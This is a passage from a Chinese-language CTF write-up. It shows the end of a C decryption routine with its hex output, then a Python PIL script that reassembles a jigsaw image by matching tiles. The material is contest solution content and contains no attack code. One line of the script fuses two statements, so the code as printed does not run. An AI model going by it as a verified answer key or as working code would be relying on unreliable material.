        ct[1] = b1;
        ct[2] = b2;
        ct[3] = b3;
        for(int i=0;i<8;i++){
            printf("0x%x,", ct[i]);
        }
    
    }
    
    int main()
    {
        decrypt();
    }
    

输出是：

    
    
    0x7ac10c4d,0x8db932c0,0x3bcb75a,0x796cdcac,0x9ddefec9,0x6f901a2c,0x575f7ae5,0x56c3ba58
    

把这个用 AES 解密就可以得到 flag。

## 拼图

把原图切成 51 * 27 的 6400 个小图，依次和给定的图片匹配，这样可以匹配 6378 张图片，还剩22张，得到：

![](https://p3.ssl.qhimg.com/t01818e14482ced585d.png)

剩下的 22 张图片手动拼接，得到：

![](https://p0.ssl.qhimg.com/t0129456e6715de226a.png)

**exp**

    
    
    from PIL import Image
    import os
    import json
    import shutil
    
    
    SINGLE_X = 51
    SINGLE_Y = 27
    
    def get_one_block(pic, lx, ly):
        new_pic = Image.new("RGB",(SINGLE_X, SINGLE_Y))
        for i in range(lx, lx + SINGLE_X):
            for j in range(ly, ly+SINGLE_Y):
                try:
                    pix = pic.getpixel((i,j))
                    new_pic.putpixel((i-lx,j-ly), pix)
                except IndexError:
                    print(lx, ly, j, i)
        return new_pic
    
    def put_one_block(pic, lx, ly, new_pic):
        for i in range(lx, lx + SINGLE_X):
            for j in range(ly, ly+SINGLE_Y):
                try:
                    pix = new_pic.getpixel((i-lx,j-ly))
                    pic.putpixel((i,j), pix)
                except IndexError:
                    print(lx, ly, j, i)
    
    
    split_names = os.listdir("./new_pic/")
    split_names = [i for i in split_names if "png" in i]
    
    origin_names = os.listdir("./file_d0wnl0ad/")
    origin_names = [i for i in origin_names if "png" in i]
    
    def get_pic_datas(pattern, names):
        pic_data = []
        for i in names:
            im = Image.open(pattern.format(i))
            pic_data.append(list(im.getdata()))
            im.close()
        return pic_data
    
    def get_pairs():
        origin_datas = get_pic_datas("./file_d0wnl0ad/{}", origin_names)
        split_datas = get_pic_datas("./new_pic/{}", split_names)
        pairs = dict()
        PIX_NUMBER = 5 
        new_one = 0
        for i in split_datas:
            pair = [j for j in origin_datas if j == i]
            if len(pair) == 1:
                split_n = split_names[split_datas.index(i)]
                origin_n = origin_names[origin_datas.index(pair[0])]
                pairs[split_n] = origin_n
            else:
                pair = [j for j in origin_datas if j[-PIX_NUMBER:] == i[-PIX_NUMBER:]]
                if len(pair) == 1:
                    new_one += 1
                    split_n = split_names[split_datas.index(i)]
                    origin_n = origin_names[origin_datas.index(pair[0])]
                    pairs[split_n] = origin_n
                else:
                    print(len(pair))
        print(new_one)
        return pairs
    
    def combine_pic(pairs):
        new_demo = Image.new("RGB", (4096,2160))
        for split_n,origin_n in pairs.items():
            li, lj = split_n.split('.')[0].split('_')
            li, lj = int(li), int(lj)
            new_pic = Image.open("./file_d0wnl0ad/{}".format(origin_n))
            put_one_block(new_demo, li * SINGLE_X, lj * SINGLE_Y, new_pic)
            new_pic.close()
        return new_demo
    
    
    if __name__ == "__main__":
        demo = Image.open("./file_d0wnl0ad/demo.jpg")
        # im = get_one_block(demo, 0,0)
        # im.show()
        # for i in range(0, 80):
        #     for j in range(0, 80):
        #         im = get_one_block(demo, i * SINGLE_X, j * SINGLE_Y)
        #         im.save("new_pic/{}_{}.png".format(i,j))
    
        pairs = get_pairs()     print(len(pairs))
        with open("pairs.json", "w") as f:
            json.dump(pairs, f)
    
        with open("pairs.json", "r") as f:
            pairs = json.load(f)
        # left = [i for i in origin_names if i not in pairs.values()]
        # print(len(left))
        # for i in left:
        #     shutil.copyfile("./file_d0wnl0ad/{}".format(i), "./left_pic/{}".format(i))
        # print(left)
    
        # new_demo = combine_pic(pairs)
        # new_demo.show()
        # new_demo.save("new_demo.png")
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wywwzjj** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/216694](/post/id/216694)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __24赞

 __收藏

![](https://p5.ssl.qhimg.com/t0164e1b26ed647594d.png) wywwzjj

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

